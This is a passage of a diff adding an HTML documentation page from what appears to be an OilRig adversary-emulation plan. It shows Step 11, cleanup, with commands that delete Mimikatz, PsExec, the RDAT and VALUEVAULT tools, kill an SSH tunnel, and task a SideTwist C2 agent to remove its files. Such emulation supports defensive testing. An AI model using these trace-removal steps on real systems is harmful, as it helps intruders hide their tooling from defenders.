+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-11---cleanup">#</doc-anchor-trigger>
+        <span>Step 11 - Cleanup</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 11 emulates OilRig&#x27;s cleanup and egress from the target network.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>From within your PsExec session from <code v-pre>WATERFALLS</code> to <code v-pre>ENDOFROAD</code>:</p>
+<p>Delete RDAT:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">del C:\ProgramData\VMware\VMware.exe</code></pre>
+</doc-codeblock></div>
+<p>Delete the parent directory:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">rmdir C:\ProgramData\VMware</code></pre>
+</doc-codeblock></div>
+<p>Terminate the PsExec session to ENDOFROAD:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">exit</code></pre>
+</doc-codeblock></div>
+<p>Terminate the command prompt spawned by Mimikatz running as Tous</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">exit</code></pre>
+</doc-codeblock></div>
+<p>From your elevated command prompt on <code v-pre>WATERFALLS</code> (via RDP):</p>
+<p>Delete Mimikatz, RDAT, and PsExec from disk.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">del C:\Windows\System32\mom64.exe C:\Windows\temp\Nt.dat C:\Windows\System32\ps.exe </code></pre>
+</doc-codeblock></div>
+<p>From Kali:</p>
+<p>Find the PID of the SSH tunnel and terminate it.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">ps aux | grep ssh</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">kill &lt;PID&gt;</code></pre>
+</doc-codeblock></div>
+<p>From your C2 callback into <code v-pre>THEBLOCK</code>:</p>
+<p>Instruct the SideTwist agent to delete VALUEVAULT, the VALUEVAULT output,
+plink.exe, and the SideTwist killswitch file.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task goTb '101 del C:\Users\gosta\AppData\Roaming\b.exe C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe C:\Users\gosta\AppData\Local\SystemFailureReporter\update.xml'</code></pre>
+</doc-codeblock></div>
+<hr>
+<p><span class="docs-emoji">&#x1F534;</span> End of Scenario. <em>Note: SideTwist will continue to execute but
+will not beacon without the update.xml file</em></p>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../managedservices/oilrig/resources/valuevault/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">VALUEVAULT</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../managedservices/oilrig/emulation_plan/yaml/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">DEPENDENCIES</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Scenario Overview", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
